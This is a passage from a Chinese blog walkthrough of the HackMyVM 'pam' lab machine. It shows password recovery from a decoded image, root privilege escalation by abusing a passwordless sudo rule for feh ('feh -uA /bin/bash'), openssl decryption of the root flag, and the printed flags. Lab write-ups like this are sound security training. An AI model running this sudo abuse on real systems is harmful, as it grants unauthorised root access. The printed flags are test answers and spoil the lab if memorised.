+SEzKAACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDE
+pAwAkJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzK
+AACJSRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwA
+kJiUAQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJ
+SRkAIDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiU
+AQASkzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkA
+IDEpAwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQAS
+kzIAQGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEp
+AwAkJmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIA
+QGJSBgBITMoAAIlJGQAgMSkDACQmZQCAxKQMAJCYlAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk
+JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMAJCZlAIDEpAwAkJiUAQASkzIAQGJS
+BoCn+fr8+Hh&#x2F;e3v779r032&#x2F;vHx+fX+uNaqYB3nf76DnCja&#x2F;P9c43Pj7XG+TyFS3fnnV5JikDwBNM
+SfA7YEJT0tSL5uujY5SS9+358fm+3vfGjqH+hPB8sp2MlAHgwTb2x1vlVYLHpkzpaLUZ&#x2F;m1SBgA2
+2hUfxVZ4aMq82ksyEykDAJvsTo9CzDwwZV7vJZmJlAGADcaHx+NSpnSkbPv+b1IGAPqV&#x2F;oLmYv7g
+UrVLoh32YSlTmHvql2QmUgYAuhVL5u3Xx5TKn20Kttg4Zd4&#x2F;v3qsY3QoFVP2kpEyANBtw+sahXII
+blpKmfWPBylFWLY9&#x2F;56UAYBOhTyJt834xk9KmcLM878kM5EyAEw73bX1ZwOsA87Wnxy0Dnax&#x2F;uyB
+4lc2CrvmX0qZTC&#x2F;JrI&#x2F;uYv1RXVfKrAOOetKsoy3WHx0jZQB2+Jq&#x2F;ML&#x2F;4JtXlO2p3XaUrwza&#x2F;+Day
+&#x2F;mKAdYg7&#x2F;b8gYIR19&#x2F;pl&#x2F;aNb3d1zfsoUSubvvCRTfS7Oj3DtuVhNmWXg9WffpgH3PLcPTbJFygBs
+0veF+4vpAt1&#x2F;eY62jcC8kaz3qOsc79uuUDpNIR+2pcyye07b57f59yRt3i9Lf7k0Mpb2++p+jJcC
+We91rZwypTNfdD8NJ8cn2SJlALpVr+4FXRfnbQO3XxDYM9HZ3wiaLfkQ3&#x2F;Z9Spj1X+9sOsc&#x2F;&#x2F;JLM
+jsc4KIVCyvQM3lNzYybZImUA+uy4Kq8a1&#x2F;w9A1f30sL+2+nZrzcUlyM8552PSl+LlAZ&#x2F;9hIdeTLe
+nHn4XHkr&#x2F;5XkL41VHDbJFikD0Gv&#x2F;pbmy9+0dtHi1zx0y5dnHMzvlMVkV5jK&#x2F;rLMov9XnZPtP+u55
+c+zZcsYTeyZlAM4zOjyOXO&#x2F;jbeTI3rRxBxmvMvnCpjl+Ab91j&#x2F;zov5U7cMqdf8G0QWkNh06yRcoA
+bHN9kZ52sfmtpJf&#x2F;O5&#x2F;&#x2F;WXyvbVwJxQv++pmOi9Kg0ZjlVxIuLyVMo82izzXVd&#x2F;bz1Xa&#x2F;YmQd2DIr
+o062DvywDGxMbH5788XtAxwmQiVllufg5dlS&#x2F;OxR6VkzdpItUgZgs&#x2F;lTTOVrbnwZjy758S2nodc&#x2F;
+vxLeNNg+g62pumHPpzKP&#x2F;LCduKS2+VUm19gzG8oD73q14hExWDzh8Bm5PL7zn5aerqXzvLv9NND6
+Rzf6n9iTfZNskTIAw0VX8mDXDC&#x2F;4xd21a9DoRh0b7LPe9PGjVg6VkCms4ezystblNt9b5b3S2uwq
+mcnpMVM639qBvyoPb3yi8ZJ333b0JFukDMB4wUU&#x2F;uOJHW0Ptah&#x2F;c&#x2F;u7m4Xaz&#x2F;m3VepM&#x2F;p5gjs0Yc
+FO57f6&#x2F;ufXgW37hLY75HxTPbf9D4+VKIx94bj55ki5QBXtrOPenoVTc4bN8Vv7SJLIJt++721Sy4
+uHxd3PyFcX0fwjl5DWszri7HIrx3eOj4OOFNd57xxcgR78aKT6K9TEXhxEoPXecSDp9ki5QBXto5
+2&#x2F;DX&#x2F;E7I9zkJCtZhrt1fyaMr&#x2F;tv6RstYcIe7me464+Vlm3WAO+es4ao2eN8I3cJDRRtsvBUv5rfC
+Tg&#x2F;R&#x2F;OivP7kXTXvUGnbGRL9wYqXxDqXMgUm2SBngpY3ehvu&#x2F;hP1WX8psdj&#x2F;T3cOW3sk8eg2v1IYe
+vvWFB4tSpjCr25tueSPsqDWUMhEpA7y0UVvIYudgFyelTLQVH5hodOJD1&#x2F;BK7fzD0zooPI&#x2F;gQPG8
+Nix0cNNRazi8EsKJlcbrPPrwSbZIGeCljduGaxtvj&#x2F;v97eiIi9Kev&#x2F;vlo&#x2F;tTH7eG12pnf86uF55H
+b3YU1vnQmG13CzG8EsKJlcbrPPrwSbZIGeCljdpC9g70z4NT5uLnTT3rrXvcnfuwNbxSGbN+RgeE
+x+zNjsLZ9O7ao9ZQykSkDPDSRm0hhXH+fWvpb0E79KXM2&#x2F;v6Dt9uW&#x2F;b9r9l8p48pcIqv2tye&#x2F;Kg1
+&#x2F;Kcy4raQ+fy4vM36l&#x2F;fCEOFRpcw6xrXSeFIGIK+wOiqbbrBB9O2Z23byw8J3rp6458zije5i66G3
+bJrdtw1398IDEw565oMYTu7AQ7blZLsPPnqSLVIGoC24Nlf3q77bh&#x2F;vgoAv+5&#x2F;zLodZ&#x2F;rwnmcN6W
+M4l3ucWeAoiHi0aKSyY62e7mKd10z4n0KpxG9ZDza3Hrv97ZUh3diz16ki1SBqAtuIhXN&#x2F;zg9tF1
+fMs+cvHVVSg&#x2F;W0n1+2Jm0aZTPbNj4hNe7DxqYcTb1S5srvHuWhjz&#x2F;tcS7dixDyudyXTY6KH+9+uN
+1h&#x2F;c6Fy&#x2F;SenA0ciDJ9kiZQDaogt+eccKL+RbNs3oK16ufj92Y68MBr18sdv8P74&#x2F;5jcEh&#x2F;vNaTtx
+cX9brG90qQv2utISziNe3rgUvXNpFZ9rZaKXhVzWrnibvRtyp+oyzud8+ZbF5e3e608vwnlVl+&#x2F;n
+GVN6rkw2L+GOSbZIGYC20pX5e2dbze+mHXjJny&#x2F;6s&#x2F;U&#x2F;rpW+zq41YIfTduLjUwvnVt6Mm0rVdmim
+J5fMkdkFKXhg9RbjlzDq1QYpA9Dh+DZcuubv30uCEY9uTOVpDnBSyuwft7Jn7l7IE9fvn4H1dvAZ
+c8YSbl9EKQPQ4&#x2F;A+XL4877&#x2F;m34x5cFuabf8&#x2F;4n5npcxkz5k3TnXXYj4kZGYH1vL3eR96zjROd9gk
+W6QMQJ+DoVC97K9ve9wi&#x2F;PqU&#x2F;b8ialb6S6tBTkyZzYP3NMfW+e74m5EjdjxngimGz+r3j55T71nD
+MZNskTIAvb4&#x2F;aFE3N0awQbQu&#x2F;H2DL6Yj1KKj9ibNkjCMBjs1ZSa9Kxh&#x2F;iibU&#x2F;aA8Yv3ubXjOlJ40
+ccpMy9wYuqdjLgZMskXKAGxR&#x2F;TDH9P+Tly&#x2F;H2JEyi+pnRa4P0GEZq&#x2F;JBm4tNQx5zdsos+h6fTaaF
+rH0Iah50veVTNJ4z8wQrfVBMmUl83rtO+NgkW6QMwC7zR1S&#x2F;zZ9XXX88yvIR2B+Hx&#x2F;893GT+wfpn
+r+n6hEed669F&#x2F;HsLOM3o9&#x2F;xGnfU64jTk+qMDzpiklAEAEpMyAEBiUgYASEzKAACJSRkAIDEpAwAk
+JmUAgMSkDACQmJQBABKTMgBAYlIGAEhMygAAiUkZACAxKQMApPW&#x2F;&#x2F;&#x2F;0fnhRRXLJhxqQAAAAASUVO
+RK5CYIJTYWx0ZWRfX54VlA40aUEkKV8ULE+OjZv5Z6cblsROzw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过赛博厨子，可以看到这是一个图片，直接去招一个base64转图片的网站进行转换</p>
+<p><img src="/posts/a7519f09/image-20260326112256033.png" alt="image-20260326112256033"></p>
+<p><img src="/posts/a7519f09/image-20260326112305031.png" alt="image-20260326112305031"></p>
+<p>密码就是<code>rootidCLOSE</code>,并且下面还有一个加密格式，猜测后续会用到</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@pam:&#x2F;home&#x2F;italia$ su italia
+Password:
+italia@pam:~$ id
+uid&#x3D;1000(italia) gid&#x3D;1000(italia) grupos&#x3D;1000(italia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="italia–-gt-root"><a href="#italia–-gt-root" class="headerlink" title="italia–&gt;root"></a>italia–&gt;root</h2><pre class="line-numbers language-none"><code class="language-none">italia@pam:~$ sudo -l
+Matching Defaults entries for italia on pam:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User italia may run the following commands on pam:
+    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;feh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以以root身份执行feh，看一下帮助手册</p>
+<pre class="line-numbers language-none"><code class="language-none">-A, --action [flag][[title]]action
+             Specify a shell command as an action to perform on the image.  In slideshow or multiwindow mode, the action will be run when the action_0
+             key is pressed, in list mode, it will be run for each file.  In loadable&#x2F;unloadable mode, it will be run for each loadable&#x2F;unloadable file,
+             respectively.  In thumbnail mode, clicking on an image will cause the action to run instead of opening the image.
+
+             If flag is &quot;;&quot;, feh will reload the current image instead of switching to the next one (slideshow mode) or closing the window (multiwindow
+             mode) after executing the action.  If [title] is specified (note the literal &quot;[&quot; and &quot;]&quot;), --draw-actions will display title instead of
+             action in the action list.  Note that title must not start with a space.  If it does, the action is handled as if it did not have a title.
+             This special case exists for backwards compatibility reasons and makes sure that actions like &quot;[ -L %F ] &amp;&amp; foo&quot; still work.
+
+             The action will be executed by &#x2F;bin&#x2F;sh.  Use format specifiers to refer to image info, see FORMAT SPECIFIERS for details.  Example usage:
+             &quot;feh -A &quot;mv %F ~&#x2F;images&#x2F;%N&quot; *&quot;.
+
+-U, --loadable
+             Don&#39;t display images.  Just print out their names if imlib2 can successfully load them.  Returns false if at least one image failed to load<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这两个参数搭配使用，正好可以执行命令，</p>
+<pre class="line-numbers language-none"><code class="language-none">italia@pam:~$ sudo &#x2F;usr&#x2F;bin&#x2F;feh -uA id
+.&#x2F;.Xauthority
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;.bash_logout
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;.bashrc
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;.profile
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;.selected_editor
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;pazz.php
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)
+.&#x2F;user.txt
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当然也可以执行bash</p>
+<pre class="line-numbers language-none"><code class="language-none">italia@pam:~$ sudo &#x2F;usr&#x2F;bin&#x2F;feh -uA &#x2F;bin&#x2F;bash
+.&#x2F;.Xauthority
+root@pam:&#x2F;home&#x2F;italia# id
+uid&#x3D;0(root) gid&#x3D;0(root) grupos&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>rootflag还需通过刚才得知的加密方式进行解密</p>
+<pre class="line-numbers language-none"><code class="language-none">root@pam:~# ls
+root.enc
+root@pam:~# cat root.enc
+��6�&#96;_޸91�0�3��s�<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>传到本地解一下</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]
+└─# openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE
+*** WARNING : deprecated key derivation used.
+Using -iter or -pbkdf2 would be better.
+
+┌──(root㉿kali)-[~]
+└─# cat root.txt
+HMVZcBzDKmcFJwnkdsnQbXV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">user
+mcZavkYkoLYUEHxQNNyiHMV
+root
+HMVZcBzDKmcFJwnkdsnQbXV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/a7519f09.html">https://drume2.github.io/posts/a7519f09.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/22f9d5cc.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">群友靶机-lanSSudoyy</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/877cf9fc.html" title="HMV-Art"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="title">HMV-Art</div></div></a></div><div><a href="/posts/2c2bf748.html" title="HMV-Blackhat"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-19</div><div class="title">HMV-Blackhat</div></div></a></div><div><a href="/posts/b97023cc.html" title="HMV-Beloved"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-17</div><div class="title">HMV-Beloved</div></div></a></div><div><a href="/posts/d17ac07d.html" title="HMV-Breakout"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="title">HMV-Breakout</div></div></a></div><div><a href="/posts/fa16f4c.html" title="HMV-Comingsoon"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-31</div><div class="title">HMV-Comingsoon</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HMV-pam"><span class="toc-number">1.</span> <span class="toc-text">HMV-pam</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21ftp%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">21ftp服务探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data%E2%80%93-gt-italia"><span class="toc-number">1.4.</span> <span class="toc-text">www-data–&gt;italia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#italia%E2%80%93-gt-root"><span class="toc-number">1.5.</span> <span class="toc-text">italia–&gt;root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.6.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/a7519f09.html" title="HMV-pam"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-pam"/></a><div class="content"><a class="title" href="/posts/a7519f09.html" title="HMV-pam">HMV-pam</a><time datetime="2026-03-26T03:03:55.000Z" title="发表于 2026-03-26 11:03:55">2026-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22f9d5cc.html" title="群友靶机-lanSSudoyy"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-lanSSudoyy"/></a><div class="content"><a class="title" href="/posts/22f9d5cc.html" title="群友靶机-lanSSudoyy">群友靶机-lanSSudoyy</a><time datetime="2026-03-25T09:05:21.000Z" title="发表于 2026-03-25 17:05:21">2026-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ccc7b205.html" title="群友靶机-busybox"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-busybox"/></a><div class="content"><a class="title" href="/posts/ccc7b205.html" title="群友靶机-busybox">群友靶机-busybox</a><time datetime="2026-02-11T06:25:42.000Z" title="发表于 2026-02-11 14:25:42">2026-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/df52e3cb.html" title="群友靶机-SudoHome"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-SudoHome"/></a><div class="content"><a class="title" href="/posts/df52e3cb.html" title="群友靶机-SudoHome">群友靶机-SudoHome</a><time datetime="2025-11-23T04:39:26.000Z" title="发表于 2025-11-23 12:39:26">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f480f654.html" title="群友靶机-Yibasuo"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Yibasuo"/></a><div class="content"><a class="title" href="/posts/f480f654.html" title="群友靶机-Yibasuo">群友靶机-Yibasuo</a><time datetime="2025-11-22T04:19:10.000Z" title="发表于 2025-11-22 12:19:10">2025-11-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2026  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
